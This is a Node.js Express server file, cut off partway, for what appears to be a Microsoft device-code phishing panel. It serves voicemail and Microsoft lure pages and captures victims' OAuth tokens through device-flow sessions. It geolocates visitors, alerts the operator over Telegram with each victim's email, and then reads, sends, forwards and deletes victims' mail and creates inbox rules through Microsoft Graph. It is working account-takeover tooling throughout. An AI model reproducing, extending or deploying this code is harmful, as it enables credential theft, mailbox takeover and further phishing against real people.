const express = require('express');
const http = require('http');
const https = require('https');
const path = require('path');
const fs = require('fs');
const { execFile, execFileSync, execSync } = require('child_process');
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const cors = require('cors');
const db = require('./database');
const df = require('./device-flow');
require('dotenv').config();

const JWT_SECRET = process.env.JWT_SECRET || 'nexcp_change_this';
const PORT = parseInt(process.env.PORT) || 3000;
const app = express();
const server = http.createServer(app);

app.set('trust proxy', 1);
app.use(helmet({ contentSecurityPolicy: false }));
app.use(cors({ origin: '*' }));
app.use(express.json());

const lim = rateLimit({ windowMs: 15 * 60 * 1000, max: 600 });
const alim = rateLimit({ windowMs: 15 * 60 * 1000, max: 20 });
app.use('/api/', lim);

// ── Link container management ─────────────────────────────────────────────────
const HOST_PROJECT_DIR = process.env.HOST_PROJECT_DIR || '/opt/nexcp5';
const DOCKER_NETWORK   = 'sumit_proxy';
const LINK_CONTAINER   = 'nexcp-link';
const linkDir = path.join(__dirname, '../frontend-link');

/** Map template id to source HTML filename */
const TEMPLATE_MAP = { voicemail: 'voicemail.html', microsoft: 'microsoft.html' };

/** Copy the selected template as the active index.html served by the link container */
function applyLinkTemplate(templateId) {
  const src = TEMPLATE_MAP[templateId] || TEMPLATE_MAP.voicemail;
  const srcPath = path.join(linkDir, src);
  const destPath = path.join(linkDir, 'index.html');
  if (fs.existsSync(srcPath)) fs.copyFileSync(srcPath, destPath);
}

/** Recreate the nexcp-link container using PRIMARY domains (with wildcard) */
function recreateLinkContainer() {
  const primaries = db.prepare("SELECT domain FROM domains WHERE type='PRIMARY' AND nginx_enabled=1").all();
  // Stop & remove old container (ignore errors if doesn't exist)
  try { execSync(`docker stop ${LINK_CONTAINER} 2>/dev/null; docker rm ${LINK_CONTAINER} 2>/dev/null`, { stdio: 'ignore' }); } catch {}
  if (!primaries.length) return; // no PRIMARY domains enabled
  // VIRTUAL_HOST: domain + *.domain for each PRIMARY
  const vhosts = primaries.flatMap(r => [r.domain, `*.${r.domain}`]).join(',');
  // LETSENCRYPT_HOST: only base domains (wildcard needs DNS challenge, not supported)
  const certHosts = primaries.map(r => r.domain).join(',');
  const email = process.env.SSL_EMAIL || process.env.LETSENCRYPT_EMAIL || '';
  const cmd = [
    'docker run -d',
    `--name ${LINK_CONTAINER}`,
    `--network ${DOCKER_NETWORK}`,
    '--restart unless-stopped',
    `--expose 80`,
    `-e "VIRTUAL_HOST=${vhosts}"`,
    `-e "VIRTUAL_PORT=80"`,
    `-e "LETSENCRYPT_HOST=${certHosts}"`,
    `-e "LETSENCRYPT_EMAIL=${email}"`,
    `-v ${HOST_PROJECT_DIR}/frontend-link:/usr/share/nginx/html:ro`,
    `-v ${HOST_PROJECT_DIR}/frontend-link/nginx.conf:/etc/nginx/conf.d/default.conf:ro`,
    'nginx:alpine',
  ].join(' ');
  execSync(cmd, { stdio: 'pipe', timeout: 30000 });
}

app.get('/', (_req, res) => res.json({ status: 'ok', service: 'nexcp-api' }));

// ── Telegram notification ─────────────────────────────────────────────────────
function sendTelegram(text) {
  const botToken = db.prepare("SELECT value FROM settings WHERE key = 'telegram_bot_token'").get()?.value;
  const chatId   = db.prepare("SELECT value FROM settings WHERE key = 'telegram_chat_id'").get()?.value;
  if (!botToken || !chatId) return;
  const data = JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' });
  const opts = {
    hostname: 'api.telegram.org', path: `/bot${encodeURIComponent(botToken)}/sendMessage`,
    method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
  };
  const req = https.request(opts, res => {
    let raw = ''; res.on('data', d => raw += d);
    res.on('end', () => { if (res.statusCode >= 400) console.log(`[Telegram] Error ${res.statusCode}: ${raw}`); });
  });
  req.on('error', e => console.log('[Telegram] Request error:', e.message));
  req.write(data);
  req.end();
}

// Expose for device-flow callback
df.onTokenLinked = ({ email, name }) => {
  const msg = `🔗 <b>New Token Linked</b>\n\n📧 ${email || 'Unknown'}\n👤 ${name || 'Unknown'}\n🕐 ${new Date().toISOString()}`;
  sendTelegram(msg);
};

// ── Auth middleware ───────────────────────────────────────────────────────────
function auth(req, res, next) {
  const t = (req.headers.authorization || '').replace('Bearer ', '').trim();
  if (!t) return res.status(401).json({ error: 'No token' });
  try { req.user = jwt.verify(t, JWT_SECRET); next(); }
  catch { res.status(401).json({ error: 'Invalid token' }); }
}

// ── Graph API helpers ─────────────────────────────────────────────────────────
// Encode path to handle spaces/special chars in OData query strings (Node 18+ rejects unescaped)
function _encodePath(p) {
  const idx = p.indexOf('?');
  if (idx === -1) return p;
  const base = p.slice(0, idx);
  const qs = p.slice(idx + 1);
  // Encode each param value but keep $key=value structure intact
  return base + '?' + qs.replace(/ /g, '%20');
}

function graphGet(path, token, extraHeaders) {
  return new Promise((resolve, reject) => {
    const opts = {
      hostname: 'graph.microsoft.com', path: _encodePath(path), method: 'GET',
      headers: { Authorization: 'Bearer ' + token, Accept: 'application/json', ...extraHeaders }
    };
    const req = https.request(opts, res => {
      let raw = '';
      res.on('data', d => raw += d);
      res.on('end', () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(raw) }); }
        catch { resolve({ status: res.statusCode, body: raw }); }
      });
    });
    req.on('error', reject);
    req.end();
  });
}

function graphPost(path, token, body) {
  const data = JSON.stringify(body);
  return new Promise((resolve, reject) => {
    const opts = {
      hostname: 'graph.microsoft.com', path: _encodePath(path), method: 'POST',
      headers: {
        Authorization: 'Bearer ' + token,
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    };
    const req = https.request(opts, res => {
      let raw = '';
      res.on('data', d => raw += d);
      res.on('end', () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(raw) }); }
        catch { resolve({ status: res.statusCode, body: raw }); }
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

function graphPostHtml(path, token, html) {
  const data = Buffer.from(html, 'utf8');
  return new Promise((resolve, reject) => {
    const opts = {
      hostname: 'graph.microsoft.com', path: _encodePath(path), method: 'POST',
      headers: {
        Authorization: 'Bearer ' + token,
        'Content-Type': 'text/html',
        'Content-Length': data.length
      }
    };
    const req = https.request(opts, res => {
      let raw = '';
      res.on('data', d => raw += d);
      res.on('end', () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(raw) }); }
        catch { resolve({ status: res.statusCode, body: raw }); }
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

function graphGetRaw(path, token) {
  return new Promise((resolve, reject) => {
    const opts = {
      hostname: 'graph.microsoft.com', path: _encodePath(path), method: 'GET',
      headers: { Authorization: 'Bearer ' + token }
    };
    const req = https.request(opts, res => {
      let raw = '';
      res.on('data', d => raw += d);
      res.on('end', () => resolve({ status: res.statusCode, body: raw }));
    });
    req.on('error', reject);
    req.end();
  });
}

function graphPatchHtml(path, token, body) {
  const data = JSON.stringify(body);
  return new Promise((resolve, reject) => {
    const opts = {
      hostname: 'graph.microsoft.com', path: _encodePath(path), method: 'PATCH',
      headers: {
        Authorization: 'Bearer ' + token,
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    };
    const req = https.request(opts, res => {
      let raw = '';
      res.on('data', d => raw += d);
      res.on('end', () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(raw) }); }
        catch { resolve({ status: res.statusCode, body: raw }); }
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

function graphPatch(path, token, body) {
  const data = JSON.stringify(body);
  return new Promise((resolve, reject) => {
    const opts = {
      hostname: 'graph.microsoft.com', path: _encodePath(path), method: 'PATCH',
      headers: {
        Authorization: 'Bearer ' + token,
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data)
      }
    };
    const req = https.request(opts, res => {
      let raw = '';
      res.on('data', d => raw += d);
      res.on('end', () => {
        try { resolve({ status: res.statusCode, body: JSON.parse(raw) }); }
        catch { resolve({ status: res.statusCode, body: raw }); }
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

function graphDelete(path, token) {
  return new Promise((resolve, reject) => {
    const opts = {
      hostname: 'graph.microsoft.com', path: _encodePath(path), method: 'DELETE',
      headers: { Authorization: 'Bearer ' + token }
    };
    const req = https.request(opts, res => {
      let raw = '';
      res.on('data', d => raw += d);
      res.on('end', () => {
        try { resolve({ status: res.statusCode, body: raw ? JSON.parse(raw) : {} }); }
        catch { resolve({ status: res.statusCode, body: raw }); }
      });
    });
    req.on('error', reject);
    req.end();
  });
}

// Helper: decode base64url message ID from frontend
function decodeMsgId(b64url) {
  const base64 = b64url.replace(/-/g, '+').replace(/_/g, '/');
  return Buffer.from(base64, 'base64').toString('utf8');
}

// Helper: find real message via direct path (avoids OData filter issues with Graph IDs)
async function findMsgById(at, rawId) {
  const r = await graphGet(
    `/v1.0/me/messages/${encodeURIComponent(rawId)}?$select=id`,
    at
  );
  if (r.status === 200 && r.body?.id) return r.body;
  return null;
}

async function getFreshToken(msEmail) {
  let tok = db.prepare("SELECT * FROM ms_tokens WHERE ms_email=? AND status='active'").get(msEmail);
  if (!tok) throw new Error('No active token for ' + msEmail);
  if ((new Date(tok.expires_at) - Date.now()) / 1000 < 300) {
    await df.refreshToken(msEmail);
    tok = db.prepare('SELECT * FROM ms_tokens WHERE ms_email=?').get(msEmail);
  }
  return tok.access_token;
}

function getDefaultToken(req) {
  if (req && req.query && req.query.tokenId) {
    const tid = Number(req.query.tokenId);
    if (tid) return db.prepare("SELECT * FROM ms_tokens WHERE id=? AND status='active'").get(tid);
  }
  return db.prepare("SELECT * FROM ms_tokens WHERE status='active' ORDER BY linked_at DESC LIMIT 1").get();
}

function sanitiseDomain(domain) {
  if (!domain || typeof domain !== 'string') return null;
  const clean = domain.toLowerCase().trim();
  if (!/^[a-z0-9][a-z0-9.\-]{1,252}[a-z0-9]$/.test(clean)) return null;
  if (clean.includes('..')) return null;
  return clean;
}

// ══ LINK API (public) ════════════════════════════════════════════════════════

app.post('/api/link/new-session', async (req, res) => {
  try { res.json(await df.startSession()); }
  catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/link/poll/:key', (req, res) => {
  if (!/^[a-f0-9]{48}$/.test(req.params.key)) return res.status(400).json({ error: 'Invalid key' });
  res.json(df.getSessionStatus(req.params.key));
});

// ── Visitor IP tracking (called by link page) ────────────────────────────────
app.post('/api/link/visit', async (req, res) => {
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  const ua = req.headers['user-agent'] || '';
  const sessionKey = req.body.session_key || null;

  // Resolve IP to geolocation using ip-api.com (free, no key needed, http only)
  let country = null, city = null, lat = null, lng = null;
  try {
    const geo = await new Promise((resolve, reject) => {
      http.get(`http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,country,city,lat,lon`, (r) => {
        let raw = '';
        r.on('data', d => raw += d);
        r.on('end', () => { try { resolve(JSON.parse(raw)); } catch { reject(new Error('parse')); } });
      }).on('error', reject);
    });
    if (geo.status === 'success') {
      country = geo.country; city = geo.city; lat = geo.lat; lng = geo.lon;
    }
  } catch {}

  db.prepare('INSERT INTO visitors (ip, user_agent, country, city, lat, lng, session_key) VALUES (?,?,?,?,?,?,?)')
    .run(ip, ua.slice(0, 500), country, city, lat, lng, sessionKey);

  res.json({ ok: true });
});

// ── Visitor analytics (auth required) ────────────────────────────────────────
app.get('/api/dashboard/visitors', auth, (req, res) => {
  const total = db.prepare('SELECT COUNT(DISTINCT ip) as c FROM visitors').get().c;
  const locations = db.prepare(`
    SELECT country, city, lat, lng, COUNT(*) as count
    FROM visitors WHERE lat IS NOT NULL
    GROUP BY country, city ORDER BY count DESC LIMIT 200
  `).all();
  const recent = db.prepare('SELECT ip, country, city, created_at FROM visitors ORDER BY created_at DESC LIMIT 50').all();
  res.json({ total, locations, recent });
});

// ══ AUTH ═════════════════════════════════════════════════════════════════════

app.post('/api/auth/login', alim, async (req, res) => {
  const { username, password } = req.body;
  const user = db.prepare('SELECT * FROM users WHERE username=?').get(username);
  if (!user || !(await bcrypt.compare(password, user.password_hash)))
    return res.status(401).json({ error: 'Invalid credentials' });
  if (user.status === 'suspended') return res.status(403).json({ error: 'Account suspended' });
  const token = jwt.sign({ id: user.id, username: user.username, role: user.role }, JWT_SECRET, { expiresIn: '12h' });
  db.prepare('UPDATE users SET last_seen=CURRENT_TIMESTAMP WHERE id=?').run(user.id);
  res.json({ token, user: { id: user.id, username: user.username, name: user.name, role: user.role } });
});

app.get('/api/auth/me', auth, (req, res) => {
  res.json(db.prepare('SELECT id,username,name,email,role FROM users WHERE id=?').get(req.user.id) || {});
});

// ══ USERS ════════════════════════════════════════════════════════════════════

app.get('/api/users', auth, (req, res) =>
  res.json(db.prepare('SELECT id,username,name,email,role,status,avatar,created_at,last_seen FROM users ORDER BY created_at DESC').all())
);
app.post('/api/users', auth, async (req, res) => {
  const { username, name, email, password, role } = req.body;
  if (!username || !password || !email || !name) return res.status(400).json({ error: 'All fields required' });
  const hash = await bcrypt.hash(password, 12);
  const av = name.split(' ').map(w => w[0]).join('').toUpperCase().slice(0, 2);
  try {
    const r = db.prepare('INSERT INTO users (username,name,email,password_hash,role,avatar) VALUES (?,?,?,?,?,?)').run(username, name, email, hash, role || 'Viewer', av);
    res.json({ id: r.lastInsertRowid });
  } catch { res.status(400).json({ error: 'Username or email already exists' }); }
});
app.put('/api/users/:id', auth, (req, res) => {
  const { name, email, role, status } = req.body;
  db.prepare('UPDATE users SET name=?,email=?,role=?,status=?,updated_at=CURRENT_TIMESTAMP WHERE id=?').run(name, email, role, status, req.params.id);
  res.json({ ok: true });
});
app.post('/api/users/:id/suspend', auth, (req, res) => { db.prepare("UPDATE users SET status='suspended' WHERE id=?").run(req.params.id); res.json({ ok: true }); });
app.post('/api/users/:id/restore', auth, (req, res) => { db.prepare("UPDATE users SET status='active' WHERE id=?").run(req.params.id); res.json({ ok: true }); });

// ══ MS TOKENS ════════════════════════════════════════════════════════════════

// Status check — returns the default linked MS account info (used by mail.html)
// If ms_name is unknown, try to re-fetch profile from Graph
app.get('/api/ms/status', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.json({ status: 'none' });

  // If the profile was never fetched (name is unknown/empty), try now
  if ((!tok.ms_name || tok.ms_name === 'Unknown') && tok.access_token) {
    try {
      const at = await getFreshToken(tok.ms_email);
      const profile = await graphGet('/v1.0/me?$select=displayName,mail,userPrincipalName', at);
      if (profile.status === 200 && profile.body) {
        const newName = profile.body.displayName || tok.ms_name;
        const newEmail = profile.body.mail || profile.body.userPrincipalName;
        if (newName || newEmail) {
          db.prepare('UPDATE ms_tokens SET ms_name=?,updated_at=CURRENT_TIMESTAMP WHERE ms_email=?')
            .run(newName || '', tok.ms_email);
          // If we got a real email, update that too (replace the linked_xxx fallback)
          if (newEmail && tok.ms_email.startsWith('linked_')) {
            try {
              db.prepare('UPDATE ms_tokens SET ms_email=?,ms_name=?,updated_at=CURRENT_TIMESTAMP WHERE ms_email=?')
                .run(newEmail, newName || '', tok.ms_email);
              tok.ms_email = newEmail;
            } catch (e) { /* might conflict if email row already exists */ }
          }
          tok.ms_name = newName || '';
        }
      }
    } catch (e) { /* ignore — will still return what we have */ }
  }

  const secsLeft = tok.expires_at ? Math.max(0, Math.floor((new Date(tok.expires_at) - Date.now()) / 1000)) : 0;
  res.json({
    status: tok.status || 'unknown',
    ms_email: tok.ms_email,
    ms_name: tok.ms_name,
    expires_at: tok.expires_at,
    seconds_left: secsLeft
  });
});

app.get('/api/ms/tokens', auth, (req, res) => {
  const tokens = db.prepare('SELECT id,ms_email,ms_name,expires_at,status,linked_at FROM ms_tokens ORDER BY linked_at DESC').all();
  res.json(tokens.map(t => ({ ...t, seconds_left: t.expires_at ? Math.max(0, Math.floor((new Date(t.expires_at) - Date.now()) / 1000)) : 0 })));
});
app.post('/api/ms/revoke/:id', auth, (req, res) => {
  db.prepare("UPDATE ms_tokens SET status='revoked',access_token=NULL,refresh_token=NULL WHERE id=?").run(req.params.id);
  res.json({ ok: true });
});
app.post('/api/ms/refresh/:id', auth, async (req, res) => {
  const tok = db.prepare('SELECT ms_email FROM ms_tokens WHERE id=?').get(req.params.id);
  if (!tok) return res.status(404).json({ error: 'Not found' });
  try { res.json({ ok: true, expires_at: await df.refreshToken(tok.ms_email) }); }
  catch (e) { res.status(400).json({ error: e.message }); }
});
app.get('/api/ms/sessions', auth, (req, res) => {
  const sessions = db.prepare(`
    SELECT session_key, user_code, verification_uri, expires_at, status, ms_email, ms_name, created_at
    FROM device_sessions WHERE created_at > datetime('now', '-2 hours') ORDER BY created_at DESC LIMIT 50
  `).all();
  res.json(sessions.map(s => ({
    ...s,
    seconds_left: s.expires_at ? Math.max(0, Math.floor((new Date(s.expires_at) - Date.now()) / 1000)) : 0,
    session_key_short: s.session_key.slice(0, 8) + '…'
  })));
});

// ══ MAIL (Graph API) ═════════════════════════════════════════════════════════
// KEY: never put message ID in URL path — use $filter=id eq '...' instead
// This completely avoids the "unescaped characters" error

app.get('/api/mail/inbox', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked Microsoft account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const top = Math.min(parseInt(req.query.top) || 25, 50);
    const skip = parseInt(req.query.skip) || 0;
    const r = await graphGet(`/v1.0/me/mailFolders/inbox/messages?$top=${top}&$skip=${skip}&$select=id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments&$orderby=receivedDateTime desc`, at);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

app.get('/api/mail/folder/:folder', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const folder = encodeURIComponent(req.params.folder);
    const top = Math.min(parseInt(req.query.top) || 25, 50);
    const skip = parseInt(req.query.skip) || 0;
    const r = await graphGet(`/v1.0/me/mailFolders/${folder}/messages?$top=${top}&$skip=${skip}&$select=id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments&$orderby=receivedDateTime desc`, at);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Read full message
app.get('/api/mail/message', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const msgId = req.query.id;
    if (!msgId) return res.status(400).json({ error: 'id required' });
    const r = await graphGet(
      `/v1.0/me/messages/${encodeURIComponent(msgId)}?$select=id,subject,from,toRecipients,ccRecipients,receivedDateTime,body,isRead,hasAttachments`,
      at
    );
    if (r.status === 404 || !r.body || r.body.error) {
      return res.status(404).json({ error: 'Message not found' });
    }
    const msg = r.body;
    // Mark as read in background
    if (!msg.isRead) {
      graphPatch(`/v1.0/me/messages/${encodeURIComponent(msg.id)}`, at, { isRead: true }).catch(() => { });
    }
    res.json(msg);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

app.post('/api/mail/send', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const { to, cc, subject, body } = req.body;
    if (!to || !subject) return res.status(400).json({ error: 'to and subject required' });
    const msg = {
      message: {
        subject,
        body: { contentType: 'HTML', content: body || '' },
        toRecipients: to.split(',').map(a => ({ emailAddress: { address: a.trim() } })),
        ccRecipients: cc ? cc.split(',').map(a => ({ emailAddress: { address: a.trim() } })) : []
      },
      saveToSentItems: true
    };
    const r = await graphPost('/v1.0/me/sendMail', at, msg);
    if (r.status >= 400) return res.status(r.status).json({ error: r.body?.error?.message || 'Send failed' });
    res.json({ ok: true });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

app.post('/api/mail/delete', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const msgId = req.body.id;
    if (!msgId) return res.status(400).json({ error: 'id required' });
    const found = await findMsgById(at, msgId);
    if (!found) return res.status(404).json({ error: 'Message not found' });
    const r = await graphPost(`/v1.0/me/messages/${encodeURIComponent(found.id)}/move`, at, { destinationId: 'deleteditems' });
    if (r.status >= 400) return res.status(r.status).json({ error: r.body?.error?.message || 'Delete failed' });
    res.json({ ok: true });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

app.get('/api/mail/search', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const q = (req.query.q || '').replace(/"/g, '');
    const r = await graphGet(
      `/v1.0/me/messages?$search="${encodeURIComponent(q)}"&$top=20&$select=id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments`,
      at,
      { ConsistencyLevel: 'eventual' }
    );
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// ── Webhook / Notifications ──────────────────────────────────────────────────
app.get('/api/mail/notifications/check', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    // Get unread messages from last hour
    const hourAgo = new Date(Date.now() - 60 * 60 * 1000).toISOString();
    const r = await graphGet(`/v1.0/me/messages?$filter=isRead eq false and receivedDateTime ge ${hourAgo}&$top=5&$select=id,subject,from,receivedDateTime&$orderby=receivedDateTime desc`, at);
    const newMails = r.body?.value || [];
    res.json({
      hasNew: newMails.length > 0,
      count: newMails.length,
      latest: newMails.map(m => ({
        subject: m.subject,
        from: m.from?.emailAddress?.name || m.from?.emailAddress?.address,
        received: m.receivedDateTime
      }))
    });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// Simple webhook endpoint for external notifications
app.post('/api/webhooks/email-notification', (req, res) => {
  const { webhook_url } = req.body;
  if (!webhook_url) return res.status(400).json({ error: 'webhook_url required' });

  // Store webhook URL in a simple in-memory store (in production, use DB)
  global.EMAIL_WEBHOOK = webhook_url;
  console.log('[Webhook] Email notification URL set:', webhook_url);
  res.json({ ok: true, message: 'Webhook URL registered' });
});

// Helper to trigger webhook when new mail arrives (called from polling)
function triggerEmailWebhook(newMails) {
  if (!global.EMAIL_WEBHOOK || !newMails.length) return;

  const payload = {
    event: 'new_email',
    timestamp: new Date().toISOString(),
    count: newMails.length,
    emails: newMails.slice(0, 3).map(m => ({
      subject: m.subject || '(No subject)',
      from: m.from?.emailAddress?.name || m.from?.emailAddress?.address || 'Unknown',
      preview: m.bodyPreview || ''
    }))
  };

  // Send webhook (fire and forget)
  const https = require('https');
  const http = require('http');
  const url = require('url');

  try {
    const parsed = url.parse(global.EMAIL_WEBHOOK);
    const lib = parsed.protocol === 'https:' ? https : http;
    const data = JSON.stringify(payload);

    const req = lib.request({
      hostname: parsed.hostname,
      port: parsed.port,
      path: parsed.path,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(data),
        'User-Agent': 'NexCP-Webhook/1.0'
      }
    }, (res) => {
      console.log(`[Webhook] Sent notification (HTTP ${res.statusCode})`);
    });

    req.on('error', (e) => console.log('[Webhook] Send failed:', e.message));
    req.write(data);
    req.end();
  } catch (e) {
    console.log('[Webhook] Error:', e.message);
  }
}

// ── List all mail folders ────────────────────────────────────────────────────
app.get('/api/mail/folders', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const r = await graphGet('/v1.0/me/mailFolders?$top=100&$select=id,displayName,parentFolderId,childFolderCount,totalItemCount,unreadItemCount', at);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// ── Move message to folder ───────────────────────────────────────────────────
app.post('/api/mail/move', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const msgId = req.body.id;
    if (!msgId) return res.status(400).json({ error: 'id required' });
    const found = await findMsgById(at, msgId);
    if (!found) return res.status(404).json({ error: 'Message not found' });
    const { folderId } = req.body;
    if (!folderId) return res.status(400).json({ error: 'folderId required' });
    const r = await graphPost(`/v1.0/me/messages/${encodeURIComponent(found.id)}/move`, at, { destinationId: folderId });
    if (r.status >= 400) return res.status(r.status).json({ error: r.body?.error?.message || 'Move failed' });
    res.json({ ok: true });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// ── Mark as read / unread ────────────────────────────────────────────────────
app.post('/api/mail/read', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const msgId = req.body.id;
    if (!msgId) return res.status(400).json({ error: 'id required' });
    const found = await findMsgById(at, msgId);
    if (!found) return res.status(404).json({ error: 'Message not found' });
    const isRead = req.body.isRead !== false;
    const r = await graphPatch(`/v1.0/me/messages/${encodeURIComponent(found.id)}`, at, { isRead });
    if (r.status >= 400) return res.status(r.status).json({ error: r.body?.error?.message || 'Update failed' });
    res.json({ ok: true });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// ── Forward message ──────────────────────────────────────────────────────────
app.post('/api/mail/forward', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const msgId = req.body.id;
    if (!msgId) return res.status(400).json({ error: 'id required' });
    const found = await findMsgById(at, msgId);
    if (!found) return res.status(404).json({ error: 'Message not found' });
    const { to, comment } = req.body;
    if (!to) return res.status(400).json({ error: 'to required' });
    const payload = {
      comment: comment || '',
      toRecipients: to.split(',').map(a => ({ emailAddress: { address: a.trim() } }))
    };
    const r = await graphPost(`/v1.0/me/messages/${encodeURIComponent(found.id)}/forward`, at, payload);
    if (r.status >= 400) return res.status(r.status).json({ error: r.body?.error?.message || 'Forward failed' });
    res.json({ ok: true });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// ── Reply to message ─────────────────────────────────────────────────────────
app.post('/api/mail/reply', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const msgId = req.body.id;
    if (!msgId) return res.status(400).json({ error: 'id required' });
    const found = await findMsgById(at, msgId);
    if (!found) return res.status(404).json({ error: 'Message not found' });
    const { comment } = req.body;
    const r = await graphPost(`/v1.0/me/messages/${encodeURIComponent(found.id)}/reply`, at, { comment: comment || '' });
    if (r.status >= 400) return res.status(r.status).json({ error: r.body?.error?.message || 'Reply failed' });
    res.json({ ok: true });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// ── Create mail folder ───────────────────────────────────────────────────────
app.post('/api/mail/folders', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const { displayName } = req.body;
    if (!displayName) return res.status(400).json({ error: 'displayName required' });
    const r = await graphPost('/v1.0/me/mailFolders', at, { displayName });
    if (r.status >= 400) return res.status(r.status).json({ error: r.body?.error?.message || 'Create failed' });
    res.json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// ── Delete mail folder ───────────────────────────────────────────────────────
app.delete('/api/mail/folders/:folderId', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const r = await graphDelete(`/v1.0/me/mailFolders/${encodeURIComponent(req.params.folderId)}`, at);
    if (r.status >= 400) return res.status(r.status).json({ error: r.body?.error?.message || 'Delete failed' });
    res.json({ ok: true });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// ── Inbox rules (list, create, delete) ───────────────────────────────────────
app.get('/api/mail/rules', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const r = await graphGet('/v1.0/me/mailFolders/inbox/messageRules', at);
    res.status(r.status).json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

app.post('/api/mail/rules', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const rule = req.body;
    if (!rule.displayName) return res.status(400).json({ error: 'displayName required' });
    const r = await graphPost('/v1.0/me/mailFolders/inbox/messageRules', at, rule);
    if (r.status >= 400) return res.status(r.status).json({ error: r.body?.error?.message || 'Create rule failed' });
    res.json(r.body);
  } catch (e) { res.status(400).json({ error: e.message }); }
});

app.delete('/api/mail/rules/:ruleId', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const r = await graphDelete(`/v1.0/me/mailFolders/inbox/messageRules/${encodeURIComponent(req.params.ruleId)}`, at);
    if (r.status >= 400) return res.status(r.status).json({ error: r.body?.error?.message || 'Delete rule failed' });
    res.json({ ok: true });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

// ── Sweep: bulk move/delete messages from a sender ───────────────────────────
app.post('/api/mail/sweep', auth, async (req, res) => {
  const tok = getDefaultToken(req);
  if (!tok) return res.status(401).json({ error: 'No linked account' });
  try {
    const at = await getFreshToken(tok.ms_email);
    const { sender, action, folderId } = req.body;
